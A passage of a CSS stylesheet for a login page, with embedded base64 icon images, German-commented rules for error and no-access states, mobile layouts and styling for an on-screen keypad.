q0h839aZtBEII9tlDPoRG2Ry6HbvF5ztt+O0K/pQzB3wjia7YCv3fQ4tSBUfLhdDA+fZCFfa/85qayMgOEGwV0XOwZnFsXba2S9eBuU5bN5/AYL5o85H0N5WeFY3FHMzZcGE0P//nIUMQ0wQPH3s5Pxqgrlky0z247T47LMImkuGsY4xCu+VLgYohgcmzSuAzxqR5cEJdHmLOposg8OvZu0Z0VrEIXyhTKY4EmwPPJwVtxPMGVPKSJ6uq0Tk1JS2Hdh4q7b701wORKmYqIoJLhG8F4DgqUQkTPnkhgiVRTQtmBiXJsQiWh500raPdDtKJH7eb+c15QJg8aS3umgdCHsqGIcemU5xDR3GwQWihzMkO2Bf2pWPJjt47B76gh39laMZevdSAnrRhofErhV8aK2TbJL82cuBLknubY75JQ9KGDL7O8aXNX94zn0mANiOK6TrtHDaCpQVDWFn0SXCCu4uAHluqOS/ywp5pBjZp7HWgm6gVa3O6E51tW8Ekj6m8q+fOx8nmvOfbfAea9qlYMnOLE/wiu+daRFu05gbgkO24zmkVzM5Q12oGSCB+H+mvHzOArX73ZukQbqfC6JWCumCkdnIgxWaIqzzOV+hsq2uar1DfdsdQ5joQaOHeaa1JVM04b6tBEY+Zqa8ca0SwXyDkA2TfU24dzq9f3FO9uhvDbI5/MFKkuOJE1aavHmtpcwJxJvqTsq94bjh0jgh4ZFqrqXgRyquec/tvSlATO6UjX0e+s5C8Y92Yx+Wv9gsWAYAwNL9jGzvut1W+ktYISP9XkEmE7V9SfUNOXLR1fSRYrahhEt4KV2Uv1nJ0QLGien7E0AnkO0IVBc3iSafQLNGJXTedIQddOA9nOoDHXDBiFafYKIm9XCZSOEdRMDX1KHP27nmJs2XnGjyG5/9hVfDKOrF5Mc/lfDsY0+AJo3fbnWPf+pqTtUBPi+wBiK3fOCHYcJVD1mwhklFSOKgvqv+7FG0z1RH8SjNkfUVcOFPqQEUXAVwZtuCWfbc3df8ZsAMAgYJ8oWgrrWhSAiHJNAN9CPYeOTxP/6gwNmhfTOnMCdmJITYWfKP+1bIow+s8KxwQLP8izAOK6ZFKry9vOS2YyxTXcDlEne1+axunQMbK+D07RclJiPQqD5f8FGABmtv4JiRaZKgAAAABJRU5ErkJggg==);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkViZW5lXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMTYyLjYyN3B4IiBoZWlnaHQ9IjI3LjEyNXB4IiB2aWV3Qm94PSIwIDAgMTYyLjYyNyAyNy4xMjUiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDE2Mi42MjcgMjcuMTI1Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xNy4yMzcsMTcuMTc2Yy0yLjI5NS0wLjk3NC0yLjgzOS0xLjMxMy0yLjgzOS0xLjMxM2wtMC4wMjEtMi4yNGMwLDAsMC44Ni0wLjY3MywxLjEyNy0yLjc4Mg0KCWMwLjUzNywwLjE1OSwxLjEwMy0wLjgxNiwxLjEzMy0xLjMzYzAuMDI5LTAuNDk1LTAuMDc0LTEuODY4LTAuNzMtMS43M2MwLjEzNC0xLjAzNCwwLjIzMS0xLjk2NCwwLjE4NC0yLjQ1Ng0KCWMtMC4xNzEtMS44MDEtMS45MTEtMy42OTktNC41ODktMy42OTljLTIuNjc4LDAtNC40MjEsMS44OTctNC41OTIsMy42OThDNi44NjMsNS44MTYsNi45NjEsNi43NDYsNy4wOTUsNy43OA0KCWMtMC42NTYtMC4xMzgtMC43NiwxLjIzNS0wLjczLDEuNzNjMC4wMzEsMC41MTQsMC41OTQsMS40ODksMS4xMzMsMS4zM2MwLjI2NywyLjEwOSwxLjEyNywyLjc4MiwxLjEyNywyLjc4MmwtMC4wMjEsMi4yNDENCgljMCwwLTAuNTQ1LDAuMzM4LTIuODM5LDEuMzEyYy0yLjI5NiwwLjk3NC00LjYxNCwxLjY1NC01LjMwNCwyLjc1Yy0wLjYxOSwwLjk4MS0wLjQzNCw1LjY5OS0wLjQzNCw1LjY5OWgyMi45NDgNCgljMCwwLDAuMTg2LTQuNzE4LTAuNDM0LTUuNjk5QzIxLjg1MSwxOC44MywxOS41MzIsMTguMTQ4LDE3LjIzNywxNy4xNzZ6Ii8+DQo8Zz4NCgk8cGF0aCBmaWxsPSJub25lIiBkPSJNNDMuMjUsMTUuNWMtMS4zNDgsMC0yLjQzOCwxLjAwOC0yLjQzOCwyLjI1YzAsMC44MzIsMC40OTIsMS41NTksMS4yMiwxLjk0N3YyLjU1M2gyLjQzN3YtMi41NTMNCgkJYzAuNzI5LTAuMzkxLDEuMjE5LTEuMTE1LDEuMjE5LTEuOTQ3QzQ1LjY4OCwxNi41MDgsNDQuNTk2LDE1LjUsNDMuMjUsMTUuNXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMzYuNzUsNy42MjV2M2gzLjI0OXYtM2MwLjAwMy0wLjc3MiwwLjMxMy0xLjUzMiwwLjk1Mi0yLjEyMWMwLjY0LTAuNTg5LDEuNDYxLTAuODc3LDIuMjk5LTAuODc5DQoJCWMwLjgzNiwwLjAwMiwxLjY1OSwwLjI5LDIuMjk5LDAuODc5YzAuNjM3LDAuNTg5LDAuOTQ4LDEuMzQ5LDAuOTUxLDIuMTIxdjNoMy4yNDl2LTNjMC4wMDItMS41My0wLjYzOC0zLjA3NS0xLjkwMy00LjI0Mg0KCQljLTEuMjY1LTEuMTY5LTIuOTM4LTEuNzYxLTQuNTk2LTEuNzU4Yy0xLjY1OS0wLjAwMy0zLjMzMiwwLjU4OS00LjU5OCwxLjc1OEMzNy4zODcsNC41NSwzNi43NDcsNi4wOTUsMzYuNzUsNy42MjV6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTUyLjk5OSwyNC4xMjV2LTEwLjVjMC0wLjM4NC0wLjE1OC0wLjc2OC0wLjQ3Ni0xLjA2MXMtMC43MzItMC40MzktMS4xNDgtMC40MzlIMzUuMTI0DQoJCWMtMC40MTYsMC0wLjgzMSwwLjE0Ni0xLjE0OSwwLjQzOWMtMC4zMTUsMC4yOTMtMC40NzUsMC42NzctMC40NzUsMS4wNjF2MTAuNWMwLDAuMzg0LDAuMTU4LDAuNzY4LDAuNDc1LDEuMDYxDQoJCWMwLjMxOCwwLjI5MywwLjczMywwLjQzOSwxLjE0OSwwLjQzOWgxNi4yNTFjMC40MTYsMCwwLjgzMS0wLjE0NiwxLjE0OC0wLjQzOVM1Mi45OTksMjQuNTA5LDUyLjk5OSwyNC4xMjV6IE00NC40NjgsMTkuNjk3djIuNTUzDQoJCWgtMi40Mzd2LTIuNTUzYy0wLjcyOS0wLjM5MS0xLjIyMS0xLjExNS0xLjIyMS0xLjk0N2MwLTEuMjQyLDEuMDkyLTIuMjUsMi40MzgtMi4yNXMyLjQzNywxLjAwOCwyLjQzNywyLjI1DQoJCUM0NS42ODgsMTguNTgyLDQ1LjE5NSwxOS4zMDksNDQuNDY4LDE5LjY5N3oiLz4NCjwvZz4NCjxwYXRoIGZpbGw9IiNDQzAwMDAiIGQ9Ik0xNjIuNDk2LDI2LjE1OWwtNy44MTctMTMuNjM3Yy0wLjMwMy0wLjUzLTAuODAxLTAuNTMtMS4xMDUsMGwtNy44MTgsMTMuNjM3DQoJYy0wLjMwMywwLjUzLTAuMDUsMC45NjYsMC41NjMsMC45NjZoMTUuNjE5QzE2Mi41NSwyNy4xMjUsMTYyLjgwNCwyNi42ODksMTYyLjQ5NiwyNi4xNTkgTTE1My40MzEsMTYuMDU3aDEuMzk0DQoJYzAuNDIsMCwwLjQ3OSwwLjI0MywwLjQ3OSwwLjM4OWwtMC4wMDQsMC4xMjdsLTAuMDEsMC4xNDZsLTAuMjg2LDUuMDljLTAuMDQyLDAuMzgxLTAuMjExLDAuNDU3LTAuNDkxLDAuNDU3aC0wLjc0Mg0KCWMtMC4yODEsMC0wLjQ1My0wLjA3Ni0wLjQ5NC0wLjQ2N2wtMC4yODUtNS4wOGwtMC4wMTItMC4xNDZsLTAuMDA0LTAuMTI3QzE1Mi45NzYsMTYuMywxNTMuMDM1LDE2LjA1NywxNTMuNDMxLDE2LjA1Nw0KCSBNMTU0LjE0NiwyNS44MzdjLTAuNzMxLDAtMS4zMjYtMC41ODktMS4zMjYtMS4zMTJjMC0wLjc0MiwwLjU4Mi0xLjMyMywxLjMyNi0xLjMyM2MwLjcyNywwLDEuMzE1LDAuNTk0LDEuMzE1LDEuMzIzDQoJQzE1NS40NjIsMjUuMjM0LDE1NC44NTgsMjUuODM3LDE1NC4xNDYsMjUuODM3Ii8+DQo8cGF0aCBmaWxsPSIjMDA0OTdCIiBkPSJNNzQuNjg2LDIuMTQyYy02LjM0OCwwLTExLjQ5LDUuMTQyLTExLjQ5LDExLjQ5YzAsNi4zNDcsNS4xNDQsMTEuNDg5LDExLjQ5LDExLjQ4OQ0KCWM2LjM0NiwwLDExLjQ4OS01LjE0MywxMS40ODktMTEuNDg5Qzg2LjE3NSw3LjI4NCw4MS4wMzEsMi4xNDIsNzQuNjg2LDIuMTQyeiBNNzcuNDk1LDIwLjc3bC0wLjExNiwwLjA0NQ0KCWMtMC42ODgsMC4yNzEtMS4yMzQsMC40NzgtMS42NDYsMC42MTljLTAuNDMzLDAuMTUtMC45MzcsMC4yMjgtMS40OTgsMC4yMjhjLTAuODgzLDAtMS41ODgtMC4yMjQtMi4wOS0wLjY2Ng0KCWMtMC41MTMtMC40NTEtMC43NzEtMS4wMjktMC43NzEtMS43MjJjMC0wLjI1MiwwLjAxOC0wLjUxLDAuMDU1LTAuNzcyYzAuMDM1LTAuMjU4LDAuMDkyLTAuNTQ5LDAuMTctMC44NzdsMC44NTYtMy4wMzMNCgljMC4wNzMtMC4yOCwwLjEzNy0wLjU1MSwwLjE4OC0wLjgwNmMwLjA0OS0wLjI0MiwwLjA3Mi0wLjQ2NiwwLjA3Mi0wLjY2YzAtMC4zMTItMC4wNTYtMC41My0wLjE2Mi0wLjYzNA0KCWMtMC4wNjQtMC4wNi0wLjI0NC0wLjE2LTAuNzQ4LTAuMTZjLTAuMTk3LDAtMC4zOTgsMC4wMzEtMC42MTEsMC4wOTRjLTAuMjI3LDAuMDY2LTAuNDIsMC4xMzEtMC41OCwwLjE5bC0wLjQzLDAuMTZsMC4zNjUtMS40OTYNCglsMC4xMTUtMC4wNDZjMC41NTQtMC4yMjYsMS4xMDItMC40MjUsMS42MjQtMC41OTFjMS41MTUtMC40NzksMi44MzYtMC4yNzEsMy41ODgsMC40MDFjMC40OTksMC40NDUsMC43NTIsMS4wMjcsMC43NTIsMS43MjkNCgljMCwwLjEzNi0wLjAxOSwwLjM3NC0wLjA0NywwLjcxN2MtMC4wMzMsMC4zNDItMC4wOTUsMC42NjQtMC4xODMsMC45NThsLTAuODUxLDMuMDFjLTAuMDY5LDAuMjM2LTAuMTI5LDAuNTA0LTAuMTgzLDAuODA1DQoJYy0wLjA1MSwwLjI5My0wLjA3NywwLjUxMi0wLjA3NywwLjY2MmMwLDAuMzE2LDAuMDYyLDAuNTM1LDAuMTc5LDAuNjMxYzAuMDkyLDAuMDc0LDAuMzAxLDAuMTYyLDAuNzc3LDAuMTYyDQoJYzAuMTg2LDAsMC4zOTgtMC4wMzMsMC42MzgtMC4xYzAuMjQ0LTAuMDY2LDAuNDIxLTAuMTI1LDAuNTI4LTAuMTc4bDAuNDYzLTAuMjIxTDc3LjQ5NSwyMC43N3ogTTc3LjMwNSw4LjUzMQ0KCWMtMC40MzgsMC40MS0wLjk3OSwwLjYxOS0xLjYsMC42MTljLTAuNjE5LDAtMS4xNTktMC4yMDgtMS42MDQtMC42MTljLTAuNDQ5LTAuNDE1LTAuNjc5LTAuOTI2LTAuNjc5LTEuNTE4DQoJYzAtMC41OTIsMC4yMjgtMS4xMDQsMC42NzctMS41MjRjMC44OTMtMC44MjksMi4zMjEtMC44MjgsMy4yMDUsMGMwLjQ0NiwwLjQxOSwwLjY3NCwwLjkzMSwwLjY3NCwxLjUyMw0KCUM3Ny45NzksNy42MDUsNzcuNzUyLDguMTE2LDc3LjMwNSw4LjUzMXoiLz4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik05NS40MDMsMTMuNzgyYy0zLjEzMiwwLTUuNjcxLDIuNTM4LTUuNjcxLDUuNjcyYzAsMy4xMzUsMi41MzksNS42NzMsNS42NzEsNS42NzMNCgljMy4xMzQsMCw1LjY3My0yLjUzOCw1LjY3My01LjY3M0MxMDEuMDc2LDE2LjMyLDk4LjUzNywxMy43ODIsOTUuNDAzLDEzLjc4MnogTTk1LjYxNywyMi43NjVjLTAuMTg3LDAuMTc3LTAuNDAzLDAuMjY1LTAuNjUyLDAuMjY1DQoJYy0wLjI1MywwLTAuNDcyLTAuMDg4LTAuNjU3LTAuMjY1Yy0wLjE4Ni0wLjE3Ni0wLjI3OS0wLjM4OC0wLjI3OS0wLjYzM2MwLTAuMjQ2LDAuMDk0LTAuNDU5LDAuMjc5LTAuNjM4DQoJYzAuMTg2LTAuMTgsMC40MDQtMC4yNywwLjY1Ny0wLjI3YzAuMjQ5LDAsMC40NjYsMC4wOSwwLjY1MiwwLjI3YzAuMTg3LDAuMTc5LDAuMjc5LDAuMzkyLDAuMjc5LDAuNjM4DQoJQzk1Ljg5NiwyMi4zNzcsOTUuODA0LDIyLjU4OSw5NS42MTcsMjIuNzY1eiBNOTYuOTczLDE5LjQzOWMtMC40NDYsMC40MDQtMS4wNDEsMC42MzUtMS43ODUsMC42OTNsLTAuMDI4LDAuNjZoLTAuNDMydi0xLjg4Nw0KCWMwLjQ2OC0wLjAzOSwwLjgzNS0wLjE4NywxLjEwMS0wLjQ0NGMwLjI2Ni0wLjI1NywwLjM5OC0wLjYwNiwwLjM5OC0xLjA1MWMwLTAuMzUyLTAuMDk0LTAuNjM0LTAuMjc5LTAuODQ1DQoJYy0wLjE4Ni0wLjIxMy0wLjQzNi0wLjMxOC0wLjc1LTAuMzE4Yy0wLjEzMywwLTAuMjUsMC4wMTQtMC4zNTQsMC4wNDFjLTAuMTAzLDAuMDI3LTAuMjAzLDAuMDctMC4zLDAuMTI4DQoJYzAuMDMxLDAuMTA0LDAuMDcsMC4yMzcsMC4xMTMsMC40MDFjMC4wNDQsMC4xNjMsMC4wNjYsMC4zMTMsMC4wNjYsMC40NTNjMCwwLjIyNi0wLjA3NCwwLjQwMS0wLjIyMSwwLjUyNg0KCWMtMC4xNDcsMC4xMjQtMC4zNTMsMC4xODctMC42MTQsMC4xODdjLTAuMjQ1LDAtMC40MzgtMC4wNzctMC41OC0wLjIzM2MtMC4xNDEtMC4xNTUtMC4yMTEtMC4zNDYtMC4yMTEtMC41NzINCgljMC0wLjM3MSwwLjIxMi0wLjY4NywwLjYzNi0wLjk0NXMwLjkzNi0wLjM4OCwxLjUzMy0wLjM4OGMwLjcwOSwwLDEuMjgxLDAuMTg0LDEuNzIsMC41NTNjMC40MzgsMC4zNjksMC42NTcsMC44NTQsMC42NTcsMS40Ng0KCUM5Ny42NDMsMTguNTA4LDk3LjQxOSwxOS4wMzYsOTYuOTczLDE5LjQzOXoiLz4NCjxnPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTAuMTY3LDE2LjIwMmgtMC44OTRjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDgtMC4yMDEsMC40NDgtMC40NDd2LTAuODk1QzExMC42MTUsMTYuNDAzLDExMC40MTMsMTYuMjAyLDExMC4xNjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTEuODA3LDE3Ljk5MWgwLjg5NGMwLjI0NywwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NWMwLTAuMjQ2LTAuMi0wLjQ0Ny0wLjQ0Ny0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMS4zNTksMTcuNzksMTExLjU2MSwxNy45OTEsMTExLjgwNywxNy45OTF6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwxNy45OTFoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMTcuNzksMTE0LjA5NCwxNy45OTEsMTE0LjM0LDE3Ljk5MXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTE3Ljc2NywxNi4yMDJoLTAuODk0Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzExOC4yMTQsMTYuNDAzLDExOC4wMTMsMTYuMjAyLDExNy43NjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjAuMzAxLDE2LjIwMmgtMC44OTVjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxNi40MDMsMTIwLjU0NywxNi4yMDIsMTIwLjMwMSwxNi4yMDJ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTYuMjAyaC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjIwMS0wLjQ0NiwwLjQ0N3YwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTIzLjI4LDE2LjQwMywxMjMuMDc5LDE2LjIwMiwxMjIuODMzLDE2LjIwMnoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTEwLjE2NywxOC43MzZoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMi0wLjQ0NiwwLjQ0NnYwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVDMTEwLjYxNSwxOC45MzcsMTEwLjQxMywxOC43MzYsMTEwLjE2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMS44MDcsMjAuNTI0aDAuODk0YzAuMjQ3LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1YzAtMC4yNDYtMC4yLTAuNDQ3LTAuNDQ3LTAuNDQ3aC0wLjg5NA0KCQljLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVDMTExLjM1OSwyMC4zMjMsMTExLjU2MSwyMC41MjQsMTExLjgwNywyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwyMC41MjRoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMjAuMzIzLDExNC4wOTQsMjAuNTI0LDExNC4zNCwyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMTguNzM2aC0wLjg5NGMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTE4LjIxNCwxOC45MzcsMTE4LjAxMywxOC43MzYsMTE3Ljc2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxOC45MzcsMTIwLjU0NywxOC43MzYsMTIwLjMwMSwxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjItMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwxOC45MzcsMTIzLjA3OSwxOC43MzYsMTIyLjgzMywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMC4xNjcsMjEuMjdoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMjAxLTAuNDQ2LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yLDAuNDQ3LDAuNDQ2LDAuNDQ3aDAuODk0DQoJCWMwLjI0NiwwLDAuNDQ4LTAuMjAxLDAuNDQ4LTAuNDQ3di0wLjg5NUMxMTAuNjE1LDIxLjQ3MSwxMTAuNDEzLDIxLjI3LDExMC4xNjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMjEuMjdoLTUuOTZjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2g1Ljk2DQoJCWMwLjI0NiwwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NUMxMTguMjE0LDIxLjQ3MSwxMTguMDEzLDIxLjI3LDExNy43NjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMjEuMjdoLTAuODk1Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDYtMC4yMDEsMC40NDYtMC40NDd2LTAuODk1QzEyMC43NDcsMjEuNDcxLDEyMC41NDcsMjEuMjcsMTIwLjMwMSwyMS4yN3oiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTIyLjgzMywyMS4yN2gtMC44OTVjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwyMS40NzEsMTIzLjA3OSwyMS4yNywxMjIuODMzLDIxLjI3eiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjMuNTg1LDE0LjA3aC0xNS4wNjNjLTEuMjksMC0yLjMzOSwxLjA0OS0yLjMzOSwyLjM0djYuNDM5YzAsMS4yOSwxLjA0OSwyLjM0MSwyLjMzOSwyLjM0MWgxNS4wNjMNCgkJYzEuMjksMCwyLjMzOS0xLjA1MSwyLjMzOS0yLjM0MVYxNi40MUMxMjUuOTI0LDE1LjExOSwxMjQuODc1LDE0LjA3LDEyMy41ODUsMTQuMDd6IE0xMjQuNTUsMTYuNTR2Ni4xOA0KCQljMCwwLjc0MS0wLjYwNCwxLjM0My0xLjM0NCwxLjM0M2gtMTQuMzA1Yy0wLjc0MSwwLTEuMzQ0LTAuNjAyLTEuMzQ0LTEuMzQzdi02LjE4YzAtMC43NCwwLjYwMy0xLjM0MywxLjM0NC0xLjM0M2gxNC4zMDUNCgkJQzEyMy45NDYsMTUuMTk3LDEyNC41NSwxNS44LDEyNC41NSwxNi41NHoiLz4NCjwvZz4NCjwvc3ZnPg0K); 
    background-position: bottom right;
    margin-right: 2px;
}
body.loginerror .commontext{padding-bottom:10px;}
/************************************************************************
* SONDERKLASSEN  Warnung/allgemeiner Fehler
************************************************************************/
body.alert .commonalert{
    display:block;
    color:#cc0000;
    padding:12px 0;
}
body.alert .commonalert *{
    color:inherit;
    font-weight:inherit;
}

div > .text *{
		color:inherit;
		font-weight:inherit;
}
/************************************************************************
* SONDERKLASSEN  No-Pass user hat keine Zugriff
************************************************************************/
body.noPass form,body.noPass .infotext, body.noPass .flipicon,body.noPass .col2 .links,body.noPass .whitebox-info, div.language form
{
    display:none
}

/************************************************************************
* SONDERKLASSEN  ismobile mobiles Gerät
************************************************************************/
body.ismobile .keyboard{display:none}
/************************************************************************
* general Styles for mobile devices
************************************************************************/
@media only screen and (max-width : 630px){
    body{min-width:315px;}
    div.wrapper{
        width:100%;
        padding:14px 20px;
        margin:10px auto 20px auto !important;
        }
    div.keyboard,div.col1.col > p {
        display:none;
        }
    a.openkeyboard.inInput:after{
        display:none !important;
    }    
    div.col{
         max-width:300px;
        width:100%;
        min-width:280px;
        margin:0 auto 16px auto;
        float:none;
        padding:0;
    }    
    div.col1.col > .text , body .product > p, .whitebox > h1{
        display:none;
        } 
    div.col1.col > p{
        display:block;
    }    
       
     .text.moved{
     padding-bottom:12px;
     }   
        
    /* Add "Login" after Productname */
    body .product > h2:after{
        content: ' Login';
        position:relative;
        }     
        
    div.col p,  div.col h2{
        text-align:center;
        padding: 0 0 12px 0;
        } 
     body.hasIcon .product{
        padding:0;
     }   
     body.hasIcon .producticon {
        display: block;
        width: 60px;
        height: 60px;
        position: relative;
        left: auto;
        margin: 0 auto 12px auto;
       }   
     div.product {
        border-top: none;
     }
     div.col1 > h1{
        display:none;
    } 
    h1.moved{
        background-position:center !important;
        width:100% !important;
        text-align:center;
    }
    .links {
       text-align:center;
    }
    div.product > h2{
        font-size:1.125rem;
        font-family: 'open_sanssemibold',Arial,sans-serif;
    }
    .text.moved + .commonalert.moved{
        padding-top:0;
        margin-top:-12px;
    }
    div.product > div.links{
    display:none;
    } 
    div.product{
    margin:0;
    } 
    div.language{
    position:absolute;
    top:10px;
    right:10px;
    }      
     div.isSmallScreen{
        display:block;
    }  
    div.number > input.input, div.password > input.input{
        width:82%;
    } 
    .center{
        margin:0 auto 0 auto;
        width:60%;
    }
    div.commonalert:not(.moved){display:none;}
    
    body.isApp .product p, body.isApp .language, body.isApp .infotext{
        display:none;
    }
    
}
 /************************************************************************
 * Keyboard styles
 ************************************************************************/  
  body.keyboardfile{
  background-color:#fff;
  padding:24px;
  }
 
 body.keyboardfile input[type=button],  body.keyboardfile input.keypadButton{
    width:35px !important;
    height:32px;
    background-color:#fff;
    border:solid 1px #cccccc;
    color:#00497b;
    border-radius:4px;
    margin:2px;
    font-size:16px;
    cursor:pointer;
 }
 
  body.keyboardfile input[type=button]:hover:not(.inverse){
    background-color:#ccc;
  }
  
   body.keyboardfile input[type=button]:active,  body.keyboardfile input.inverse{
    background-color:#00497b !important;
    color:#fff;
  }
 
 body.keyboardfile input.keypadButton2{
    width:115px !important;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:11px;
    }
 
 body.keyboardfile input.keypadButtonErase, body.keyboardfile input.keypadButtonOK{
    width:75px !important;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:11px;
 } 
 body.keyboardfile div.keypad{
    width:490px;
    float:left;
 }
 body.keyboardfile div.numpad{
    width:130px;
    float:left;
    margin-left:36px;
 }
 
  body.ielt10.keyboardfile div.numpad{
    width:130px;
    float:left;
    margin-left:36px;
 }
